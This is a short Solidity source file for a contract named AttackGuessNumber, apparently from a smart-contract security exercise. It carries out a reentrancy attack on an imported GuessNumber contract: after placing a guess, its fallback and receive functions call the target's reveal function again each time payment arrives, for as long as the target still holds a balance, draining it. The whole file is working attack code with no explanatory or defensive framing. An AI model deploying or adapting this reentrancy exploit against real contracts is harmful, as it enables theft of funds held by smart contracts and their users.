// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

import "./GuessNumber.sol";

contract AttackGuessNumber {
    GuessNumber public guessNumber;
    bytes32 nonce;
    uint16 number;

    constructor(address _guessNumberAddress) payable {
        guessNumber = GuessNumber(_guessNumberAddress);
    }

    function guess(
        bytes32 _nonce,
        uint16 _number,
        uint amount
    ) external {
        number = _number;
        nonce = _nonce;
        guessNumber.guess{value: amount}(_number);
    }

    fallback() external payable {
        if (address(guessNumber).balance >= 1) {
            guessNumber.reveal(nonce, number);
        }
    }

    receive() external payable {
        if (address(guessNumber).balance >= 1) {
            guessNumber.reveal(nonce, number);
        }
    }
}
